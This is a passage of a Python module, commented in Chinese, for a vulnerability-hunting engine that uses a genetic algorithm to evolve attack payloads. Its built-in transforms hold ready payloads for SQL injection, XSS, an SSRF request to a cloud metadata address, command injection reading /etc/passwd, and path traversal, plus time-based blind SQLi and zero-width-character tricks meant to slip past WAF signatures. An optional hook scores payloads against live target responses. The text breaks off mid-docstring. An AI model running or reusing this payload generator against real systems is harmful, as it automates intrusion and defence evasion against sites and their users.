#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
漏洞挖掘进化引擎 · 进化策略引擎增强层 v3.7.0
==========================================

把「进化策略引擎」(population evolution / gene library / strategy-driven /
fitness scoring / 26 cognitive strategies) 的真正能力接入漏洞挖掘，补齐
vuln_hunter_kernel V1~V4 只做了 SCAMPER 变异、没有真实遗传进化的缺口：

  · COGNITIVE_STRATEGIES —— 26 认知策略目录（策略驱动，定义可复用变换）
  · EvolutionEnhancer    —— 真实遗传算法：
        selection  适应度驱动的选择（精英保留 + 锦标赛）
        crossover  基因交叉（拼接两条成功 Payload 的子结构）
        mutate     自适应变异（SCAMPER + 认知策略，按 L4 先验偏置速率）
        evolve     多代进化，逐代抬高种群平均适应度
  · 反馈桥 feedback_bridge —— v3.5 新增：进化结果写回 meta_gene 的 L4 认知
        策略基因层（record_cognitive_strategy + save），下次进化再读回
        cognitive_bias 偏置策略选择，形成「认知策略 → 进化 → 结晶 → 再进化」
        的自进化闭环。
  · 自适应超参数进化桥 —— v3.6 新增：方案A核心，将反馈桥从只写 L4 升级为
        全层反馈（L1+L3+L4），并基于进化历史曲率自动调整 mutation_rate /
        crossover_rate / tournament_k，实现「进化→反馈→超参自适应→再进化」
        的闭环增强。
  · M5 meta融合接收 —— v3.6 新增：apply_meta_fusion() 接收 team_adapter 的
        M5 单轮融合结果，将 optimal_mutation_rate / optimal_tournament_k 和
        策略偏置写回进化引擎，打通 M5 与进化引擎的超参反馈链路。
  · 与 kernel 的 judge_response / scamper_mutate 无缝对接

设计原则（与项目一致）：仅用标准库，可离线运行（无 LLM 也能跑）。
适配度评分复用 kernel.judge_response 的 confidence，再叠加元基因血统加成。

用法：
    from evolution_enhancer import EvolutionEnhancer, COGNITIVE_STRATEGIES

    eh = EvolutionEnhancer()
    # 用一批种子 payload 做 5 代进化，自动择优
    evolved = eh.evolve(seed_payloads, vuln_type="sqli", generations=5)
    print(eh.coverage_report())
"""
from __future__ import annotations

import hashlib
import json
import random
import re
import sys
import time
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional, Tuple

# ── 复用内核能力 ──
try:
    from vuln_hunter_kernel import judge_response, scamper_mutate, mutate
except Exception:  # 允许独立运行（无 kernel）时降级
    judge_response = None
    scamper_mutate = None
    mutate = None


# ===========================================================================
# 26 认知策略目录（策略驱动）
# ===========================================================================
# 每条策略: id / name / category / kind / desc
#   kind = "transform"  → 有实际 Payload 变换函数 (apply_*)
#   kind = "meta"        → 元策略，只参与选择/调度，不直接变换
# 这些策略是「进化策略引擎」中 26 种认知策略在漏洞挖掘场景的实例化。

COGNITIVE_STRATEGIES: List[Dict] = [
    {"id": "analogy",        "name": "类比思维",     "category": "发散", "kind": "transform", "desc": "从相似漏洞类型的可用 Payload 借壳"},
    {"id": "morphology",     "name": "形态矩阵",     "category": "重组", "kind": "meta",      "desc": "把 Payload 拆成组件做矩阵组合"},
    {"id": "s_substitute",   "name": "SCAMPER-替换", "category": "变异", "kind": "transform", "desc": "替换编码/关键字达成等价语义"},
    {"id": "s_combine",      "name": "SCAMPER-组合", "category": "重组", "kind": "transform", "desc": "组合多种绕过手法"},
    {"id": "s_adapt",        "name": "SCAMPER-适配", "category": "变异", "kind": "transform", "desc": "适配上层协议/上下文的编码"},
    {"id": "s_modify",       "name": "SCAMPER-变形", "category": "变异", "kind": "transform", "desc": "大小写/注释/空白的语法变形"},
    {"id": "s_put",          "name": "SCAMPER-他用", "category": "重组", "kind": "transform", "desc": "把载荷放到别的参数/位置"},
    {"id": "s_eliminate",    "name": "SCAMPER-精简", "category": "变异", "kind": "transform", "desc": "删除冗余字符降低特征"},
    {"id": "s_reverse",      "name": "SCAMPER-逆序", "category": "变异", "kind": "transform", "desc": "从报错逆推关键语法"},
    {"id": "reverse_eng",    "name": "逆向工程",     "category": "推理", "kind": "transform", "desc": "由报错信息反构注入点语法"},
    {"id": "first_principle","name": "第一性原理",   "category": "推理", "kind": "transform", "desc": "剥离到最小可触发语法核"},
    {"id": "boundary",       "name": "极限测试",     "category": "边界", "kind": "transform", "desc": "超长/极值输入探测边界缺陷"},
    {"id": "redundancy",     "name": "冗余编码",     "category": "变异", "kind": "transform", "desc": "插入被忽略的冗余字符干扰特征"},
    {"id": "context_switch", "name": "上下文切换",   "category": "重组", "kind": "transform", "desc": "切换注入上下文/位置"},
    {"id": "combinatorial",  "name": "组合爆炸",     "category": "重组", "kind": "meta",      "desc": "对可行子结构做全排列"},
    {"id": "negative_space", "name": "负空间",       "category": "推理", "kind": "transform", "desc": "判定被过滤什么 → 反求其补集"},
    {"id": "proto_downgrade","name": "协议降级",     "category": "边界", "kind": "transform", "desc": "降级协议/语以绕过限制"},
    {"id": "temporal",       "name": "时间维度",     "category": "边界", "kind": "transform", "desc": "延迟/竞争条件触发时间盲注"},
    {"id": "enc_tunnel",     "name": "编码隧道",     "category": "变异", "kind": "transform", "desc": "多层嵌套编码绕过浅层解码"},
    {"id": "chunked",        "name": "分块传输",     "category": "重组", "kind": "transform", "desc": "把载荷拆到多个分块/参数"},
    {"id": "polymorphism",   "name": "多态",         "category": "变异", "kind": "transform", "desc": "等价语义多种写法"},
    {"id": "metacognition",  "name": "元认知",       "category": "元",   "kind": "meta",      "desc": "反思上一轮失败，调整搜索方向"},
    {"id": "grafting",       "name": "嫁接",         "category": "重组", "kind": "transform", "desc": "把两条成功载荷的子结构嫁接"},
    {"id": "mutation_memory","name": "变异记忆",     "category": "元",   "kind": "meta",      "desc": "复用过去成功变异作为先验"},
    {"id": "adversarial",    "name": "对抗样本",     "category": "变异", "kind": "transform", "desc": "微扰载荷以逃避 WAF 特征"},
    {"id": "convergence",    "name": "收敛",         "category": "元",   "kind": "meta",      "desc": "剪枝低适应度个体，聚焦精英"},
]

_STRATEGY_IDS = [s["id"] for s in COGNITIVE_STRATEGIES]
_TRANSFORM_IDS = [s["id"] for s in COGNITIVE_STRATEGIES if s["kind"] == "transform"]


# ===========================================================================
# 个体数据模型
# ===========================================================================

@dataclass
class Individual:
    """进化种群中的一个个体（一个候选 Payload）"""
    payload: str
    fitness: float = 0.0
    generation: int = 0
    lineage: List[str] = field(default_factory=list)   # 祖先策略链
    strategy_used: Optional[str] = None
    evaluated: bool = False
    uid: str = ""

    def __post_init__(self):
        if not self.uid:
            self.uid = hashlib.sha1(
                f"{self.payload}|{self.generation}".encode()
            ).hexdigest()[:10]


# ===========================================================================
# 进化策略引擎增强层
# ===========================================================================

class EvolutionEnhancer:
    """把「进化策略引擎」的种群进化能力接入漏洞挖掘

    与 kernel 对接：
      - 适应度 = judge_response(confidence) 或 scamper_mutate 成功率
      - 变异   = SCAMPER + 26 认知策略
      - 交叉   = 两条成功载荷的子结构拼接
    """

    POPULATION_SIZE = 24
    ELITE_RATIO = 0.20          # 精英保留比例
    CROSSOVER_RATE = 0.55       # 交叉概率
    MUTATION_RATE = 0.30        # 基础变异概率（按成功率自适应）
    TOURNAMENT_K = 3            # 锦标赛选择规模

    def __init__(
        self,
        population_size: int = POPULATION_SIZE,
        mutation_rate: float = MUTATION_RATE,
        seed: Optional[int] = None,
        mock: bool = False,
        meta_gene: Optional["MetaGeneLibrary"] = None,
        vuln_type: str = "",
        fingerprint: Optional[Dict] = None,
    ):
        self.population_size = population_size
        self.base_mutation_rate = mutation_rate
        self.mock = mock
        self.meta_gene = meta_gene               # 反馈桥：L4 认知策略基因库
        self.vuln_type = vuln_type
        self.fingerprint = fingerprint or {}
        self._rng = random.Random(seed if seed is not None else int(time.time()))
        self.generation = 0
        self.population: List[Individual] = []
        self.history: List[Dict] = []          # 每代摘要
        self.best: Optional[Individual] = None
        self.strategy_usage: Dict[str, int] = {s: 0 for s in _STRATEGY_IDS}
        # 反馈桥「读先验」：基于 L4 历史有效度偏置策略选择
        self._strategy_weights = self._load_cognitive_priors()
        # ── v3.6 自适应超参数进化桥 ──
        self.population_history: List[Dict] = []  # 跨轮进化历史（用于M5 + 超参自适应）
        self.current_mutation_rate = float(mutation_rate)
        self.current_crossover_rate = float(self.CROSSOVER_RATE)
        self.current_tournament_k = int(self.TOURNAMENT_K)

    def _load_cognitive_priors(self) -> Dict[str, float]:
        """从元基因库读取 L4 认知策略偏置权重（无库/无类型时返回空=公平探索）"""
        if self.meta_gene is None or not self.vuln_type:
            return {}
        try:
            return dict(self.meta_gene.cognitive_bias(self.vuln_type, _TRANSFORM_IDS))
        except Exception:
            return {}

    def _choose_strategy(self, exclude: Optional[str] = None) -> str:
        """按 L4 偏置权重挑选变异策略（反馈桥在读先验侧生效）"""
        ids = [s for s in _TRANSFORM_IDS if s != exclude]
        if self._strategy_weights:
            weights = [self._strategy_weights.get(s, 1.0) for s in ids]
            return self._rng.choices(ids, weights=weights, k=1)[0]
        return self._rng.choice(ids)

    # ════════════════════════════════════════════════════════════════════
    #  v3.6 自适应超参数进化桥（方案A核心）
    # ════════════════════════════════════════════════════════════════════

    def _adapt_hyperparameters(self) -> Dict[str, float]:
        """基于进化历史曲率自动调整超参数（v3.8 增强版）

        策略逻辑：
          · 多代趋势检测：用最近 3 代 avg_fitness 拟合斜率，而非仅看前后两代
          · 平均适应度曲率上升（连续改善超 2%）→ 降低变异率（exploitation）
          · 平均适应度曲率下降（停滞/退化）→ 提高变异率（exploration）
          · 适应度方差 < 0.05 → 增大锦标赛 K（增加多样性）
          · 适应度方差 > 0.20 → 减小锦标赛 K（聚焦精英）
          · 交叉率随改善趋势正向微调
          · 停滞检测：连续 N 代无改善 → 强制激增变异率（跳出局部最优）
          · 振荡阻尼：超参数变化幅度限制在 ±30% 以内

        返回当前超参数快照。
        """
        if len(self.history) < 2:
            return {
                "mutation_rate": self.current_mutation_rate,
                "tournament_k": self.current_tournament_k,
                "crossover_rate": self.current_crossover_rate,
            }

        # ── 多代曲率检测（最近 3 代的线性拟合斜率） ──
        recent = self.history[-3:] if len(self.history) >= 3 else self.history
        n = len(recent)
        if n >= 2:
            xs = list(range(n))
            ys = [g["avg_fitness"] for g in recent]
            mean_x = sum(xs) / n
            mean_y = sum(ys) / n
            num = sum((xs[i] - mean_x) * (ys[i] - mean_y) for i in range(n))
            den = sum((xs[i] - mean_x) ** 2 for i in range(n))
            slope = num / den if den > 0 else 0.0
        else:
            slope = 0.0

        prev_avg = self.history[-2]["avg_fitness"]
        curr_avg = self.history[-1]["avg_fitness"]
        delta = curr_avg - prev_avg

        # 适应度方差
        if self.population:
            fits = [i.fitness for i in self.population]
            mean_fit = sum(fits) / len(fits) if fits else 0.0
            variance = sum((f - mean_fit) ** 2 for f in fits) / len(fits) if fits else 0.0
        else:
            variance = 0.0

        # ── 停滞检测（连续 N 代无改善） ──
        stagnation_count = 0
        if len(self.history) >= 3:
            for g in self.history[-3:]:
                if g["max_fitness"] <= self.history[-4]["max_fitness"] if len(self.history) >= 4 else False:
                    stagnation_count += 1
        # 使用 history 中的 max_fitness 判断
        if len(self.history) >= 3:
            max_fits = [g["max_fitness"] for g in self.history[-3:]]
            if all(max_fits[i] <= max_fits[i + 1] for i in range(len(max_fits) - 1)):
                stagnation_count = 3

        # ── 种群多样性 ──
        diversity = self._compute_population_diversity()

        # ── 自适应变异率（多因子综合） ──
        if stagnation_count >= 2:
            # 停滞 → 强制激增探索
            mut_rate = min(0.70, self.current_mutation_rate * 1.50)
        elif slope > 0.02:
            # 持续改善 → 降低变异率（利用）
            mut_rate = max(0.05, self.current_mutation_rate * 0.85)
        elif delta > 0.02:
            mut_rate = max(0.05, self.current_mutation_rate * 0.85)
        elif delta < -0.01:
            # 退化 → 增加变异率（探索）
            mut_rate = min(0.60, self.current_mutation_rate * 1.30)
        else:
            # 平稳 → 微调
            mut_rate = self.current_mutation_rate * (1.0 + 0.1 * (0.5 - curr_avg))

        # ── 自适应锦标赛规模（考虑多样性） ──
        if variance < 0.05 or diversity < 0.2:
            tourney_k = min(5, self.current_tournament_k + 1)
        elif variance > 0.20 or diversity > 0.6:
            tourney_k = max(2, self.current_tournament_k - 1)
        else:
            tourney_k = self.current_tournament_k

        # ── 自适应交叉率（与变异率协同） ──
        if delta > 0.02:
            cross_rate = min(0.80, self.current_crossover_rate * 1.10)
        else:
            cross_rate = max(0.30, self.current_crossover_rate * 0.90)
        # 当变异率上升时，交叉率也适当跟随（协同探索）
        if mut_rate > self.current_mutation_rate:
            cross_rate = min(0.80, cross_rate * 1.05)

        # ── 振荡阻尼：变化幅度限制在 ±30% ──
        max_change = 0.30
        mut_rate = max(self.current_mutation_rate * (1 - max_change),
                       min(self.current_mutation_rate * (1 + max_change), mut_rate))
        cross_rate = max(self.current_crossover_rate * (1 - max_change),
                         min(self.current_crossover_rate * (1 + max_change), cross_rate))

        # 边界约束
        mut_rate = max(0.01, min(0.70, mut_rate))
        cross_rate = max(0.10, min(0.80, cross_rate))
        tourney_k = max(2, min(5, tourney_k))

        self.current_mutation_rate = round(mut_rate, 3)
        self.current_crossover_rate = round(cross_rate, 3)
        self.current_tournament_k = int(tourney_k)

        # ── 自适应种群规模（v3.8 新增） ──
        self._adapt_population_size()

        return {
            "mutation_rate": self.current_mutation_rate,
            "tournament_k": self.current_tournament_k,
            "crossover_rate": self.current_crossover_rate,
            "variance": round(variance, 3),
            "diversity": round(diversity, 3),
            "slope": round(slope, 4),
            "stagnation": stagnation_count,
        }

    # ====================================================================
    #  适应度评估
    # ====================================================================

    def evaluate(self, ind: Individual, vuln_type: str,
                 response_fn: Optional[Callable] = None) -> float:
        """评估个体适应度 (0.0 ~ 1.0)

        真实环境：用 response_fn 拿到响应 → judge_response 给 confidence
        离线环境：用 mock 评分（基于载荷结构启发式）
        """
        if ind.evaluated and ind.fitness > 0:
            return ind.fitness

        if response_fn is not None and judge_response is not None:
            try:
                resp = response_fn(ind.payload)
                verdict = judge_response(resp.get("body", ""), vuln_type)
                fit = float(verdict.get("confidence", 0.0))
            except Exception:
                fit = self._mock_fitness(ind.payload, vuln_type)
        else:
            fit = self._mock_fitness(ind.payload, vuln_type)

        # 元基因血统加成：携带已知有效策略线 → 轻微加权
        if ind.lineage:
            fit = min(1.0, fit + 0.04 * len(set(ind.lineage)))

        ind.fitness = round(fit, 3)
        ind.evaluated = True
        return ind.fitness

    @staticmethod
    def _mock_fitness(payload: str, vuln_type: str) -> float:
        """离线启发式评分：结构越「像」可用载荷，分数越高

        仅作为无 LLM / 无真实响应时的占位评分，便于本地演示与闭环测试。
        """
        score = 0.0
        p = payload.lower()
        # 注入类核心语法
        if vuln_type == "sqli":
            if any(k in p for k in ("' or", "1=1", "union select", "sleep(",
                                    "benchmark(", "or 1", "'--", "/*")):
                score += 0.45
            if any(k in p for k in ("sleep(", "benchmark(", "waitfor")):
                score += 0.15
        elif vuln_type.startswith("xss"):
            if any(k in p for k in ("<script", "onerror=", "alert(",
                                    "svg/onload", "<img")):
                score += 0.45
        elif vuln_type in ("ssrf", "cmdi", "lfi", "path_traversal"):
            if any(k in p for k in ("file://", "gopher://", "http://",
                                    ";", "|", "../", "/etc/", "whoami")):
                score += 0.45
        # 编码/变形痕迹（降低 WAF 命中 → 加分）
        if any(c in payload for c in ("%", "\\u", "/**/", "${", "&&")):
            score += 0.10
        # 长度惩罚（过长易被特征命中）
        score -= min(0.15, len(payload) / 2000.0)
        return round(max(0.0, min(1.0, score)), 3)

    # ====================================================================
    #  选择（精英 + 锦标赛）
    # ====================================================================

    def select_parent(self, population: List[Individual]) -> Individual:
        """锦标赛选择：随机抽 K 个，取适应度最高者
        使用 self.current_tournament_k 而非硬编码常量，确保自适应超参数桥生效
        """
        candidates = self._rng.sample(population, min(self.current_tournament_k, len(population)))
        return max(candidates, key=lambda i: i.fitness)

    def select_elites(self, population: List[Individual]) -> List[Individual]:
        """精英保留：按适应度取前 N 个直接进下一代"""
        ranked = sorted(population, key=lambda i: i.fitness, reverse=True)
        n = max(1, int(len(ranked) * self.ELITE_RATIO))
        elites = ranked[:n]
        for e in elites:                       # 克隆，避免引用污染
            e.lineage = list(e.lineage)
        return elites

    # ====================================================================
    #  交叉（基因重组）
    # ====================================================================

    def crossover(self, p1: Individual, p2: Individual,
                  vuln_type: str) -> Individual:
        """把两条载荷在语法边界处拼接，产出新个体

        优先在 SQL 关键字、标签边界、参数分隔处分割，保留语法合法性概率。
        """
        a, b = p1.payload, p2.payload
        # 候选切点：常见语法边界
        cuts = [m.start() for m in re.finditer(r"(?i)(select|union|where|from|"
                                               r"<script|onerror|;|\||&|\?\w*=)", a)]
        cut = self._rng.choice(cuts) if cuts else len(a) // 2
        head = a[:cut]
        # 从 b 取尾部，并把 b 的前导空白/引号补齐
        tail = b[max(0, cut - 10):]
        child_payload = (head + tail).strip()

        child = Individual(
            payload=child_payload,
            generation=self.generation + 1,
            lineage=(p1.lineage + p2.lineage)[-4:] + ["grafting"],
            strategy_used="grafting",
        )
        return child

    # ====================================================================
    #  变异（SCAMPER + 26 认知策略）
    # ====================================================================

    def mutate(self, ind: Individual, vuln_type: str,
               strategy: Optional[str] = None) -> Individual:
        """对个体做一次变异，产生子代

        优先使用 kernel 的 scamper_mutate；否则用内置 transform。
        strategy 为空时按 L4 偏置（cognitive_bias）挑一条 transform 策略。
        """
        strat = strategy or self._choose_strategy()
        self.strategy_usage[strat] = self.strategy_usage.get(strat, 0) + 1

        # 优先走 kernel 的 SCAMPER（更贴近实战）
        if scamper_mutate is not None and strat.startswith("s_"):
            try:
                op = strat.split("_", 1)[1]
                variants = scamper_mutate(ind.payload, vuln_type, [op])
                # kernel 返回 List[Tuple[payload, op]]
                new_payload = variants[0][0] if variants else ind.payload
            except Exception:
                new_payload = self._apply_transform(ind.payload, vuln_type, strat)
        else:
            new_payload = self._apply_transform(ind.payload, vuln_type, strat)
            # 部分策略交给 kernel 进一步 SCAMPER 精炼
            if scamper_mutate is not None and self._rng.random() < 0.4:
                try:
                    variants = scamper_mutate(new_payload, vuln_type,
                                              [self._rng.choice(["substitute",
                                                                 "modify",
                                                                 "adapt"])])
                    if variants:
                        new_payload = variants[0][0]
                except Exception:
                    pass

        child = Individual(
            payload=new_payload,
            generation=self.generation + 1,
            lineage=ind.lineage[-3:] + [strat],
            strategy_used=strat,
        )
        return child

    # ---- 内置 transform 实现（不依赖 kernel 也能跑） ----

    def _apply_transform(self, payload: str, vuln_type: str, strat: str) -> str:
        rng = self._rng
        p = payload
        if strat == "analogy":
            pool = {
                "sqli": "1' OR '1'='1' -- ",
                "xss_reflected": "<svg/onload=alert(1)>",
                "ssrf": "http://169.254.169.254/latest/meta-data/",
                "cmdi": "a; cat /etc/passwd",
                "lfi": "../../../../etc/passwd",
            }
            return pool.get(vuln_type, payload)
        if strat == "s_modify":
            # 大小写混淆 + 内联注释
            out = []
            for ch in p:
                if ch.isalpha() and rng.random() < 0.4:
                    out.append(ch.upper() if ch.islower() else ch.lower())
                else:
                    out.append(ch)
            return "".join(out).replace(" ", "/**/")
        if strat == "s_substitute":
            # 编码替换等价语义
            sub = {"'": "%27", "\"": "%22", " ": "%20", "<": "%3c", ">": "%3e"}
            return "".join(sub.get(c, c) for c in p)
        if strat == "s_eliminate":
            # 删空白/注释，降低特征
            return re.sub(r"\s+", "", p).replace("/**/", "")
        if strat == "enc_tunnel":
            # 二次编码
            return "".join("%" + format(ord(c), "02x") for c in p)
        if strat == "redundancy":
            # 插入被忽略的冗余（MySQL 风格）
            return p.replace(" ", "  ").replace("(", "(" + chr(0))
        if strat == "s_combine":
            return p + "/*!" + p + "*/"
        if strat == "s_adapt":
            # 适应上下文：加注释闭合
            return p + " -- "
        if strat == "s_put":
            # 把载荷放到别的参数/位置：添加参数注入
            variants = [
                p + "&dummy=1",
                p.replace("?", "?x=") if "?" in p else p + "?x=1",
                p.replace("'", "' AND 1=1 AND '1'='1"),
            ]
            return rng.choice(variants)
        if strat == "s_reverse":
            return p[::-1]
        if strat == "reverse_eng":
            return p + "' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT 1))) -- "
        if strat == "first_principle":
            # 剥到最小触发核
            core = re.sub(r"(?i)(--.*|/\*.*?\*/|/\*\*?\*/)", "", p)
            return core.strip() or "1"
        if strat == "boundary":
            return p + "'" * 200
        if strat == "negative_space":
            # 反求被过滤字符的补集
            return p.replace("<", "%3C").replace(">", "%3E")
        if strat == "proto_downgrade":
            return p.replace("https://", "http://").replace("HTTPS://", "http://")
        if strat == "temporal":
            # 时间维度：延迟/竞争条件触发时间盲注
            variants = [
                p.replace("SLEEP(5)", "SLEEP(3)").replace("sleep(5)", "sleep(3)"),
                p + " AND SLEEP(3)",
                p.replace("1=1", "1=1 AND SLEEP(IF(1=1,3,0))"),
                p.replace("'", "' AND SLEEP(3) AND '1'='1"),
            ]
            return rng.choice(variants)
        if strat == "chunked":
            # 分块传输：把载荷拆到多个分块/参数
            mid = max(1, len(p) // 2)
            variants = [
                p[:mid] + "/*SPLIT*/" + p[mid:],
                p.replace("=", "=+").replace("'", "'+"),
                p[:mid] + "\n" + p[mid:],
                "".join(c + ("\n" if i % 5 == 4 else "") for i, c in enumerate(p)),
            ]
            return rng.choice(variants)
        if strat == "polymorphism":
            return p.replace("OR", "oR").replace("SELECT", "SeLeCt")
        if strat == "grafting":
            # 嫁接：把两条成功载荷的子结构嫁接（如果没有第二载荷，执行随机插入）
            graft_parts = [
                re.sub(r"(?i)(OR|AND|SELECT|UNION|SLEEP|EXEC|INSERT|UPDATE|DELETE|DROP)",
                       lambda m: m.group(0).upper() + chr(0) + m.group(0).lower(), p),
                p + " /*!12345" + p[:max(1, len(p)//3)] + "*/",
                re.sub(r"(?i)(\bOR\b|\bAND\b)", lambda m: m.group(0).upper(), p, count=1),
            ]
            return rng.choice(graft_parts)
        if strat == "adversarial":
            # 微扰逃避 WAF：插入零宽字符 + 换行混淆 + 注释插入
            wasm = chr(0x200B)  # 零宽空格
            variants = [
                p.replace(" ", wasm),
                p.replace("(", "(" + chr(0x200C)).replace(")", chr(0x200D) + ")"),
                p.replace("=", "/*!*/="),
                re.sub(r"(?i)(SELECT|UNION|OR|AND)", lambda m: m.group(0)[0] + "/*!" + m.group(0)[1:] + "*/", p),
            ]
            return rng.choice(variants)
        return p

    # ====================================================================
    #  反馈桥（写回侧）：把进化结果结晶进 L4 认知策略基因
    # ====================================================================

    def feedback_bridge(self, baseline_fitness: float,
                        timestamp: str = "") -> int:
        """将本轮进化结果写回元基因库 L1+L3+L4 层，构成自进化闭环

        v3.6 增强：从只写 L4 升级为全层反馈（方案A核心）
          · L4：认知策略有效度（原有）
          · L1：高适应度个体的攻击策略基因（新增）
          · L3：自适应阈值（新增，基于成功/失败个体的适应度分布）

        信用分配启发式：
          - 排名前 1/3 且适应度高于基线的个体视为「成功」，其 lineage 中所有
            参与的认知策略均记一次 success（并带 fitness_gain）；
          - 其余个体视为「未成功」，其策略记一次 failure。
        之后调用 meta_gene.save() 持久化，使下一次进化初始化即可读回先验。

        Returns:
            写入的总记录条数（无 meta_gene 时返回 0）
        """
        if self.meta_gene is None or not self.vuln_type:
            return 0
        ts = timestamp or time.strftime("%Y-%m-%dT%H:%M:%S", time.localtime())
        pop = sorted(self.population, key=lambda i: i.fitness, reverse=True)
        if not pop:
            return 0
        n_top = max(1, len(pop) // 3)
        top_uids = {i.uid for i in pop[:n_top]}
        written = 0

        # 收集成功/失败个体的适应度分布（用于 L3 阈值更新）
        success_fits = []
        fail_fits = []

        for ind in pop:
            gain = max(0.0, ind.fitness - baseline_fitness)
            strategies = set(ind.lineage + ([ind.strategy_used] if ind.strategy_used else []))
            strategies.discard("seed")
            success = (ind.uid in top_uids) and (ind.fitness > baseline_fitness)

            if success:
                success_fits.append(ind.fitness)
            else:
                fail_fits.append(ind.fitness)

            for sid in strategies:
                if sid in _STRATEGY_IDS:
                    # ── L4：认知策略有效度（原有） ──
                    self.meta_gene.record_cognitive_strategy(
                        self.vuln_type, sid, success=success,
                        fitness_gain=(gain if success else 0.0), timestamp=ts
                    )
                    written += 1
                    # ── L1：高适应度策略基因（v3.6新增） ──
                    if success and ind.fitness > 0.6 and ind.strategy_used:
                        l1_name = f"{self.vuln_type}_{ind.strategy_used}"
                        try:
                            self.meta_gene.record_strategy(
                                self.vuln_type, l1_name,
                                success=True, confidence=ind.fitness,
                                timestamp=ts,
                            )
                            written += 1
                        except Exception:
                            pass

        # ── L3：自适应阈值更新（v3.6新增） ──
        if success_fits and fail_fits:
            s_avg = sum(success_fits) / len(success_fits)
            f_avg = sum(fail_fits) / len(fail_fits)
            # 阈值 = 成功与失败适应度的分界中点
            threshold = round((s_avg + f_avg) / 2.0, 3)
            try:
                self.meta_gene.update_threshold(
                    param_name=f"confidence_{self.vuln_type}",
                    new_value=threshold,
                )
                written += 1
            except Exception:
                pass

        try:
            self.meta_gene.save()
        except Exception:
            pass
        return written

    # ════════════════════════════════════════════════════════════════════
    #  v3.8 增强：种群多样性计算 + 自适应种群规模 + 帕累托前沿 + 平衡比 + 策略协同进化
    # ════════════════════════════════════════════════════════════════════

    def _compute_population_diversity(self) -> float:
        """计算种群多样性：基于适应度方差 + 基因型差异

        Returns:
            float: 归一化多样性得分 (0.0~1.0)
        """
        pop = self.population
        if not pop or len(pop) < 2:
            return 0.0

        # 1) 适应度多样性（方差归一化）
        fits = [i.fitness for i in pop]
        mean_f = sum(fits) / len(fits)
        var_f = sum((f - mean_f) ** 2 for f in fits) / len(fits) if len(fits) > 1 else 0.0
        # 归一化：假设最大方差为 0.25（适应度范围 0~1 时）
        fitness_diversity = min(1.0, var_f / 0.25)

        # 2) 基因型多样性（基于 payload 编辑距离）
        if len(pop) > 1:
            pairs = random.sample(range(len(pop)), min(20, len(pop)))
            distances = []
            for i in range(len(pairs)):
                for j in range(i + 1, len(pairs)):
                    a = pop[pairs[i]].payload[:50]
                    b = pop[pairs[j]].payload[:50]
                    # 快速编辑距离近似
                    lev = self._levenshtein(a, b)
                    max_len = max(len(a), len(b))
                    distances.append(lev / max_len if max_len > 0 else 0.0)
            genetic_diversity = sum(distances) / len(distances) if distances else 0.0
        else:
            genetic_diversity = 0.0

        # 综合多样性 = 0.4 × 适应度多样性 + 0.6 × 基因型多样性
        return 0.4 * fitness_diversity + 0.6 * genetic_diversity

    @staticmethod
    def _levenshtein(a: str, b: str) -> int:
        """计算两个字符串的编辑距离（快速实现）"""
        if len(a) < len(b):
            a, b = b, a
        if not b:
            return len(a)
        prev = list(range(len(b) + 1))
        for i, ca in enumerate(a):
            curr = [i + 1]
            for j, cb in enumerate(b):
                cost = 0 if ca == cb else 1
                curr.append(min(
                    curr[j] + 1,       # 删除
                    prev[j + 1] + 1,   # 插入
                    prev[j] + cost     # 替换
                ))
            prev = curr
        return prev[-1]

    def _adapt_population_size(self) -> None:
        """自适应种群规模：基于收敛速度调整种群大小

        当种群收敛（多样性下降）时缩小规模以加速利用；
        当种群发散（多样性上升）时扩大规模以增加探索。
        """
        if len(self.population_history) < 3:
            return

        # 取最近 3 代的历史数据
        recent = self.population_history[-3:]
        max_fits = [g["max_fitness"] for g in recent]
        avg_fits = [g["avg_fitness"] for g in recent]

        # 计算收敛速度（max_fitness 变化率）
        if max_fits[0] > 0:
            conv_rate = (max_fits[-1] - max_fits[0]) / max_fits[0]
        else:
            conv_rate = 0.0

        # 计算多样性
        div = self._compute_population_diversity()

        # 策略：
        # - 收敛快 + 多样性低 → 利用阶段，缩小规模（加速收敛）
        # - 收敛慢 + 多样性高 → 探索阶段，扩大规模（增加搜索覆盖）
        # - 停滞（conv_rate 接近 0）→ 扩大规模（跳出局部最优）
        if conv_rate < 0.02 and div < 0.3:
            # 停滞 + 低多样性 → 跳出局部最优，扩大规模
            new_size = min(self.population_size + 5, self.population_size * 2)
        elif conv_rate > 0.1 and div < 0.2:
            # 快速收敛 + 低多样性 → 缩小规模加速利用
            new_size = max(self.population_size - 3, 10)
        elif div > 0.6:
            # 高多样性 → 探索阶段，适当扩大规模
            new_size = min(self.population_size + 2, self.population_size * 2)
        else:
            new_size = self.population_size

        if new_size != self.population_size:
            old_size = self.population_size
            self.population_size = new_size
            # 调整种群到新规模
            if new_size > old_size and self.population:
                # 扩大：用变异复制现有个体
                while len(self.population) < new_size:
                    src = random.choice(self.population)
                    child = self.mutate(src, self.vuln_type or "")
                    self.population.append(child)
            elif new_size < old_size:
                # 缩小：保留适应度最高的
                self.population.sort(key=lambda i: i.fitness, reverse=True)
                self.population = self.population[:new_size]

    def pareto_frontier(self) -> List[Individual]:
        """计算帕累托前沿：适应度 vs 多样性

        帕累托最优 = 在适应度和多样性两个维度上不被其他个体支配的个体集合。
        用于追踪"探索-利用"的最佳折中。

        Returns:
            List[Individual]: 帕累托前沿个体（非支配解）
        """
        if not self.population:
            return []

        # 计算每个个体的多样性得分（基于 payload 与其他个体的差异）
        pop = self.population
        diversity_scores = []
        for i, ind in enumerate(pop):
            distances = []
            for j, other in enumerate(pop):
                if i == j:
                    continue
                lev = self._levenshtein(ind.payload[:50], other.payload[:50])
                max_len = max(len(ind.payload[:50]), len(other.payload[:50]))
                distances.append(lev / max_len if max_len > 0 else 0.0)
            diversity_scores.append(sum(distances) / len(distances) if distances else 0.0)

        # 帕累托非支配排序
        pareto_front = []
        n = len(pop)
        for i in range(n):
            dominated = False
            for j in range(n):
                if i == j:
                    continue
                # j 支配 i 的条件：两个维度都不差且至少一个严格更好
                if (pop[j].fitness >= pop[i].fitness and
                    diversity_scores[j] >= diversity_scores[i] and
                    (pop[j].fitness > pop[i].fitness or
                     diversity_scores[j] > diversity_scores[i])):
                    dominated = True
                    break
            if not dominated:
                ind = pop[i]
                ind.diversity_score = diversity_scores[i]
                pareto_front.append(ind)

        return pareto_front

    def balance_ratio(self) -> Dict[str, float]:
        """计算当前探索-利用平衡比

        利用度 = 种群适应度均值 + 收敛速度
        探索度 = 种群多样性 + 变异率

